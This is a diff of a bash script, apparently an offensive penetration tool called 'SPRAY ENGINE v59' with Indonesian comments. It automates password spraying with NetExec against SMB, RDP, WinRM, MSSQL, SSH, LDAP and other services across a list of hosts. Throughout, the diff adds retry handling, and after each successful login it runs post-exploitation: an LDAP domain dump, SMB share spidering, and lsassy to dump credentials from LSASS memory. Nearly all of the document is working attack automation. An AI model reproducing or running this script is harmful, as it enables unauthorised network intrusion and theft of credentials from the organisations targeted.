@@ -1411,6 +1411,8 @@ OUTDIR="spray_netexec"
 RAW_OUT="$OUTDIR/raw_auth_spray.txt"
 CLEAN_OUT="$OUTDIR/final_auth_success.txt"
 SPIDER_DIR="$OUTDIR/spider_plus"
+BROKEN_PIPE_LOG="$OUTDIR/broken_pipe_hosts.txt"
+: > "$BROKEN_PIPE_LOG"
 
 echo -e "${PURPLE}====================================================${NC}"
 echo -e "${GREEN}[+] SPRAY ENGINE v59 | DEBUG & EXPLICIT MODE${NC}"
@@ -1426,133 +1428,309 @@ mapfile -t MAPFILE_P < "$PASS_FILE"
 
 PROTOCOLS=("smb" "rdp" "wmi" "winrm" "mssql" "ssh" "ftp" "vnc" "ldap")
 
+# =========================
+# BUILD IP → PROTO MAP
+# =========================
+declare -A PROTO_MAP
+
 for proto in "${PROTOCOLS[@]}"; do
     FILE_PROTO="$OUTDIR/active_$proto.txt"
     [[ ! -s "$FILE_PROTO" ]] && continue
 
-    echo -e "\n${BLUE}====================================================${NC}"
-    echo -e "${BLUE}[+] PROTOCOL: ${proto^^}${NC}"
-    echo -e "${BLUE}====================================================${NC}"
-    
-    for ip in $(cat "$FILE_PROTO"); do
-        echo -e "\n${CYAN}>>> Target Host: $ip${NC}"
-        
-        # Discovery Domain (Debugging)
-        echo -e "${GRAY}[DEBUG] Discovering domain for $ip...${NC}"
-        DOMAIN=$(nxc smb "$ip" --no-progress 2>/dev/null | grep -oP '(?<=domain:)[^ )]+' | head -n 1)
-        [[ -z "$DOMAIN" ]] && DOMAIN="."
-        echo -e "${GRAY}[DEBUG] Domain detected: $DOMAIN${NC}"
+    while read -r ip; do
+        [[ -z "$ip" ]] && continue
+        PROTO_MAP["$ip"]+="$proto "
+    done < "$FILE_PROTO"
+done
+
+# =========================
+# DOMAIN CACHE (PER IP)
+# =========================
+declare -A DOMAIN_CACHE
+
+get_domain() {
+    local ip="$1"
+
+    # cache hit
+    if [[ -n "${DOMAIN_CACHE[$ip]}" ]]; then
+        echo "${DOMAIN_CACHE[$ip]}"
+        return
+    fi
+
+    local domain=""
+    for i in {1..3}; do
+        domain=$(nxc smb "$ip" --no-progress 2>/dev/null | \
+                 grep -oP '(?<=domain:)[^ )]+' | head -n1)
+
+        [[ -n "$domain" && "$domain" != "WORKGROUP" ]] && break
+        sleep 1
+    done
+
+    [[ -z "$domain" || "$domain" == "WORKGROUP" ]] && domain="."
+
+    DOMAIN_CACHE[$ip]="$domain"
+    echo "$domain"
+}
+
+# =========================
+# RUN NXC FUNCTION
+# =========================
+run_nxc() {
+    local proto="$1" ip="$2" user="$3" pass="$4" extra="$5" domain_flag="$6"
+
+    local MAX_RETRY=3
+    local attempt=1
+
+    while (( attempt <= MAX_RETRY )); do
+      echo -e "\n${PURPLE}[EXEC][Attempt $attempt] nxc $proto $ip -u '$user' -p '$pass' $extra $domain_flag${NC}"
+
+      timeout 25s nxc "$proto" "$ip" -u "$user" -p "$pass" $extra $domain_flag --no-progress > .tmp_res 2>&1
+      exit_code=$?
+
+      cat .tmp_res
+      cat .tmp_res >> "$RAW_OUT"
+
+      # =========================
+      # 1. TIMEOUT / CONNECTION ISSUE
+      # =========================
+      if [[ $exit_code -eq 124 ]] || grep -qiE "Broken Pipe|NETBIOS connection.*timed out|connection.*timed out" .tmp_res; then
+          echo -e "${YELLOW}[!] Timeout/Connection issue (attempt $attempt/$MAX_RETRY)${NC}"
+
+          ((attempt++))
+          sleep 2
+          continue
+      fi
+
+      # =========================
+      # 2. SUCCESS
+      # =========================
+      if grep -qE "\[\+\]|Pwn3d!" .tmp_res; then
+          echo -e "${GREEN}[+] Valid credentials found${NC}"
+          grep -E "\[\+\]|Pwn3d!" .tmp_res | head -n1 >> "$CLEAN_OUT"
+          return 0
+      fi
+
+      # =========================
+      # 3. HARD FAIL (JANGAN RETRY)
+      # =========================
+      if grep -q "\[-\]" .tmp_res && ! grep -qiE "timed out|Broken Pipe" .tmp_res; then
+          echo -e "${RED}[-] Invalid credentials (no retry)${NC}"
+          return 1
+      fi
+
+      # =========================
+      # 4. OTHER FAILURE → RETRY
+      # =========================
+      echo -e "${YELLOW}[!] Auth failed / unknown response (attempt $attempt/$MAX_RETRY)${NC}"
+
+      ((attempt++))
+      sleep 1
+  done
+
+
+    # =========================
+    # AFTER ALL RETRY FAIL
+    # =========================
+    echo -e "${RED}[!] Persistent Error / Broken Pipe on $ip ($proto) → manual check needed${NC}"
+    echo "$ip;$proto;$user" >> "$BROKEN_PIPE_LOG"
+
+    return 1
+}
+
+# =========================
+# MAIN LOOP (IP FIRST)
+# =========================
+for ip in "${!PROTO_MAP[@]}"; do
+    echo -e "\n${CYAN}>>> Target Host: $ip${NC}"
+
+    # --- DOMAIN DISCOVERY ---
+    echo -e "${GRAY}[DEBUG] Discovering domain...${NC}"
+    DOMAIN=$(get_domain "$ip")
+    echo -e "${GRAY}[DEBUG] Domain: $DOMAIN${NC}"
+
+    for proto in ${PROTO_MAP[$ip]}; do
+        echo -e "\n${BLUE}[+] PROTOCOL: ${proto^^}${NC}"
 
         for user in "${MAPFILE_U[@]}"; do
             USER_COMPLETED=false
 
             for pass in "${MAPFILE_P[@]}"; do
-                
-                # --- 1. STRATEGY: LOCAL AUTH ---
+                # 1. Inisialisasi awal untuk Local Auth
                 EXTRA=""
                 [[ "$proto" =~ ^(smb|rdp|wmi|winrm|mssql)$ ]] && EXTRA="--local-auth"
-                
-                # DEBUG COMMAND ECHO
-                echo -e "\n${PURPLE}[EXEC] nxc $proto $ip -u '$user' -p '$pass' $EXTRA${NC}"
-                
-                # RUN & SHOW OUTPUT
-                # Kita tidak pakai -ne \r lagi supaya output asli NXC tidak tertimpa
-                timeout 25s nxc "$proto" "$ip" -u "$user" -p "$pass" $EXTRA --no-progress > .tmp_res 2>&1
-                cat .tmp_res # Mencetak output asli NXC ke layar
-                cat .tmp_res >> "$RAW_OUT"
-                
-                if grep -qE "\[\+\]|Pwn3d\!" .tmp_res; then
-                    echo -e "${GREEN}[!] Success found! Logging to $CLEAN_OUT${NC}"
-                    grep -E "\[\+\]|Pwn3d\!" .tmp_res | head -n 1 >> "$CLEAN_OUT"
-                    USER_COMPLETED=true
+                DOMAIN_ARG=""
 
-                    # --- LDAPDOMAINDUMP ---
+                # =========================
+                # 1. LOCAL AUTH
+                # =========================
+                # (Asumsi: fungsi run_nxc mengisi file .tmp_res)
+                if run_nxc "$proto" "$ip" "$user" "$pass" "$EXTRA" ""; then
+                    USER_COMPLETED=true
+                fi
+
+                # =========================
+                # 2. DOMAIN AUTH (skip kalau domain ".")
+                # =========================
+                if [[ "$USER_COMPLETED" == "false" && "$DOMAIN" != "." && "$proto" =~ ^(smb|rdp|wmi|winrm|mssql)$ ]]; then
+                    if run_nxc "$proto" "$ip" "$user" "$pass" "" "-d $DOMAIN"; then
+                        USER_COMPLETED=true
+                        # PERBAIKAN: Jika sukses di Domain Auth, EXTRA harus kosong
+                        # dan kita butuh flag domain untuk langkah selanjutnya
+                        EXTRA=""
+                        DOMAIN_ARG="-d $DOMAIN"
+                    fi
+                fi
+                # =========================
+                # SUCCESS HANDLING
+                # =========================
+                if [[ "$USER_COMPLETED" == "true" ]]; then
+                    AUTH_RESULT=$(cat .tmp_res)
+                    echo -e "${GREEN}[!] Success: $user@$ip${NC}"
+
+                    # --- LDAP DUMP ---
                     if [[ "$proto" == "ldap" ]]; then
                         DUMP_PATH="$OUTDIR/ldap_$ip"
                         mkdir -p "$DUMP_PATH"
-                        echo -e "${YELLOW}[!] Valid LDAP! Running ldapdomaindump...${NC}"
-                        ldapdomaindump "$ip" -u "$DOMAIN\\$user" -p "$pass" -o "$DUMP_PATH" > /dev/null 2>&1
+                        echo -e "${YELLOW}[!] Running ldapdomaindump...${NC}"
+                        LDAP_USER="${DOMAIN}\\$user"
+                        [[ "$DOMAIN" == "." ]] && LDAP_USER="$user"
+                        ldapdomaindump "$ip" -u "$LDAP_USER" -p "$pass" -o "$DUMP_PATH" >/dev/null 2>&1
                     fi
-                    # -----------------------------
-                    
-                    if [[ "$proto" == "smb" && $(grep "Pwn3d!" .tmp_res) ]]; then
-                        echo -e "${RED}[DEBUG] Pwn3d status confirmed. Triggering Post-Exploitation...${NC}"
-                        echo -e "${PURPLE}[EXEC] nxc smb $ip -u '$user' -p '$pass' $EXTRA -M lsassy${NC}"
-                        nxc smb "$ip" -u "$user" -p "$pass" $EXTRA -M lsassy | tee -a "$RAW_OUT"
-                        
-                        echo -e "${PURPLE}[EXEC] nxc smb $ip -u '$user' -p '$pass' $EXTRA -M spider_plus${NC}"
-                        nxc smb "$ip" -u "$user" -p "$pass" $EXTRA -M spider_plus -o DOWNLOAD_FLAG=FALSE EXCLUDE_FILTER="c\$,ipc\$,admin\$,netlogon,sysvol" OUTPUT_FOLDER="$(readlink -f $SPIDER_DIR)" > /dev/null 2>&1
-                    fi
-                fi
 
-                # --- 2. STRATEGY: DOMAIN AUTH ---
-                if [[ "$USER_COMPLETED" == "false" && "$proto" =~ ^(smb|rdp|wmi|winrm|mssql)$ ]]; then
-                    echo -e "${PURPLE}[EXEC] nxc $proto $ip -u '$user' -p '$pass' -d '$DOMAIN'${NC}"
-                    
-                    timeout 25s nxc "$proto" "$ip" -u "$user" -p "$pass" -d "$DOMAIN" --no-progress > .tmp_res 2>&1
-                    cat .tmp_res
-                    cat .tmp_res >> "$RAW_OUT"
-                    
-                    if grep -qE "\[\+\]|Pwn3d\!" .tmp_res; then
-                        echo -e "${GREEN}[!] Success found! Logging to $CLEAN_OUT${NC}"
-                        grep -E "\[\+\]|Pwn3d\!" .tmp_res | head -n 1 >> "$CLEAN_OUT"
-                        USER_COMPLETED=true
-                        
-                        if [[ "$proto" == "smb" && $(grep "Pwn3d!" .tmp_res) ]]; then
-                            echo -e "${RED}[DEBUG] Pwn3d status (Domain) confirmed. Triggering Post-Exploitation...${NC}"
-                            nxc smb "$ip" -u "$user" -p "$pass" -d "$DOMAIN" -M lsassy | tee -a "$RAW_OUT"
-                            nxc smb "$ip" -u "$user" -p "$pass" -d "$DOMAIN" -M spider_plus -o DOWNLOAD_FLAG=FALSE EXCLUDE_FILTER="c\$,ipc\$,admin\$,netlogon,sysvol" OUTPUT_FOLDER="$(readlink -f $SPIDER_DIR)" > /dev/null 2>&1
+                    # --- SMB POST EXPLOIT ---
+                    if [[ "$proto" == "smb" ]]; then
+                        # Cek apakah akses SMB valid (+)
+                        if echo "$AUTH_RESULT" | grep -q "\[+\]"; then
+                            echo -e "${YELLOW}[DEBUG] SMB access confirmed${NC}"
+
+                            # -------------------------------------------------------
+                            # 1. SPIDER_PLUS
+                            # -------------------------------------------------------
+                            attempt_sp=1
+                            while [ $attempt_sp -le 3 ]; do
+                                # Susun command ke dalam variabel biar gampang di-echo
+                                SP_CMD="nxc smb $ip -u '$user' -p '$pass' $DOMAIN_ARG -M spider_plus -o EXCLUDE_FILTER=c\$,ipc\$,admin\$,netlogon,sysvol OUTPUT_FOLDER=$(readlink -f "$SPIDER_DIR")"
+
+                                echo -e "${PURPLE}[EXEC][Attempt $attempt_sp] $SP_CMD${NC}"
+                                
+                                # Eksekusi command dari variabel
+                                timeout 40s bash -c "$SP_CMD" | tee .tmp_sp
+
+                                # Jika SUKSES (Ada list share)
+                                if grep -qE "Enumerated shares|SMB Shares:" .tmp_sp; then
+                                    echo -e "${GREEN}[+] spider_plus success!${NC}"
+                                    break
+                                
+                                # Jika GAGAL (Koneksi, Timeout, Broken Pipe, atau No Shares)
+                                else
+                                    if [ $attempt_sp -eq 3 ]; then
+                                        echo -e "${RED}[!] Final Attempt Fail on $ip (spider_plus) → Logged${NC}"
+                                        echo "$ip;smb_spider;$user" >> "$BROKEN_PIPE_LOG"
+                                        break
+                                    fi
+                                    
+                                    echo -e "${YELLOW}[!] Issue detected, retrying ($attempt_sp/3)...${NC}"
+                                    rm -f "$ABS_OUT/${ip}.json" 2>/dev/null
+                                    ((attempt_sp++))
+                                    sleep 3
+                                fi
+
+                            done
+
+                            # -------------------------------------------------------
+                            # 2. LSASSY (With Retry Logic - Only if Pwn3d!)
+                            # -------------------------------------------------------
+                            if echo "$AUTH_RESULT" | grep -qE "Pwn3d!|\[+\]"; then
+                              attempt_ls=1
+                              while [ $attempt_ls -le 3 ]; do
+                                  LS_CMD="nxc smb \"$ip\" -u \"$user\" -p \"$pass\" $EXTRA $DOMAIN_ARG -M lsassy"
+                                  
+                                  echo -e "${RED}[EXEC][Attempt $attempt_ls] $LS_CMD${NC}"
+                                  
+                                  # Eksekusi dengan timeout agar tidak hang
+                                  timeout 40s bash -c "$LS_CMD" | tee .tmp_ls
+
+                                  # Jika SUKSES
+                                  if grep -qiE "dumped|success" .tmp_ls; then
+                                      echo -e "${GREEN}[+] lsassy success!${NC}"
+                                      cat .tmp_ls >> "$RAW_OUT"
+                                      break
+                                      
+                                  # Jika GAGAL (Apapun alasannya: Timeout, No Admin, AV Block)
+                                  else
+                                      if [ $attempt_ls -eq 3 ]; then
+                                          echo -e "${RED}[!] Final Attempt Fail on $ip (lsassy) → Logged${NC}"
+                                          echo "$ip;smb_lsassy;$user" >> "$BROKEN_PIPE_LOG"
+                                          break
+                                      fi
+                                      
+                                      echo -e "${YELLOW}[!] lsassy failed/issue, retrying ($attempt_ls/3)...${NC}"
+                                      ((attempt_ls++))
+                                      sleep 3
+                                  fi
+                              done
+                          fi
                         fi
                     fi
-                fi
 
-                if [[ "$USER_COMPLETED" == "true" ]]; then
-                    echo -e "${CYAN}[i] Skipping other passwords for user: $user${NC}"
-                    break 
+                    echo -e "${CYAN}[i] Skipping remaining passwords for $user${NC}"
+                    break
                 fi
-                
-                rm -f .tmp_res
             done
         done
     done
 done
 
-# --- MULAI PROSES PEMBERSIHAN (DI LUAR LOOP) ---
-FINAL_OUT="$OUTDIR/final_summary.txt" 
-# 1. Bersihkan kode warna ANSI dari log mentah (RAW_OUT)
-if [ -f "$RAW_OUT" ]; then
-    sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" "$RAW_OUT" > "$OUTDIR/temp_clean.log"
+rm -f .tmp_res
 
-    # 2. Ambil baris penting & Hapus Duplikat TANPA MENGUBAH URUTAN
-    # Kita pakai awk '!x[$0]++' untuk menjaga urutan asli (chronological)
-    grep -aE "\[\*\]|\[\+\]|LSASSY" "$OUTDIR/temp_clean.log" | awk '!x[$0]++' > "$FINAL_OUT"
+# --- MULAI PROSES PEMBERSIHAN (DI LUAR LOOP) ---
+FINAL_OUT="$OUTDIR/final_summary.txt"
+
+if [[ -f "$RAW_OUT" ]]; then
+
+    # 1. Bersihkan ANSI color (lebih universal)
+    sed -E 's/\x1B\[[0-9;]*[mGK]//g' "$RAW_OUT" > "$OUTDIR/temp_clean.log"
+
+    # 2. Ambil baris penting & dedup tanpa ubah urutan
+    grep -aE "\[\*\]|\[\+\]|LSASSY" "$OUTDIR/temp_clean.log" | \
+        awk '!seen[$0]++' > "$FINAL_OUT"
 
     echo -e "\n${PURPLE}====================================================${NC}"
     echo -e "${GREEN}[+] PHASE 4: FINAL CHRONOLOGICAL SUMMARY${NC}"
     echo -e "${PURPLE}====================================================${NC}"
 
-    # 3. Cetak ke layar dengan Highlighting
-    if [ -s "$FINAL_OUT" ]; then
+    if [[ -s "$FINAL_OUT" ]]; then
         while IFS= read -r line; do
-            if echo "$line" | grep -q "LSASSY"; then
-                echo -e "${PURPLE}${line}${NC}"
-            elif echo "$line" | grep -q "\[+\]"; then
-                echo -e "${GREEN}${line}${NC}"
-            elif echo "$line" | grep -q "\[\*\]"; then
-                echo -e "${BLUE}${line}${NC}"
-            else
-                echo -e "${NC}${line}${NC}"
-            fi
+            case "$line" in
+                *LSASSY*)
+                    echo -e "${PURPLE}${line}${NC}"
+                    ;;
+                *"[+]"*)
+                    echo -e "${GREEN}${line}${NC}"
+                    ;;
+                *"[*]"*)
+                    echo -e "${BLUE}${line}${NC}"
+                    ;;
+                *)
+                    echo -e "${line}"
+                    ;;
+            esac
         done < "$FINAL_OUT"
     else
         echo -e "${YELLOW}[!] Tidak ada data ditemukan.${NC}"
     fi
+    if [[ -s "$BROKEN_PIPE_LOG" ]]; then
+      echo -e "\n${RED}[!] BROKEN PIPE HOSTS (MANUAL CHECK REQUIRED)${NC}"
+      cat "$BROKEN_PIPE_LOG"
+    fi
 
-    # Cleanup
-    rm "$OUTDIR/temp_clean.log" 2>/dev/null
+    # Cleanup aman
+    rm -f "$OUTDIR/temp_clean.log"
+
 else
     echo -e "${RED}[!] File mentah $RAW_OUT tidak ditemukan!${NC}"
 fi
+
 echo -e "\n${GREEN}[+] ALL PROCESSES FINISHED.${NC}"
 ```
 
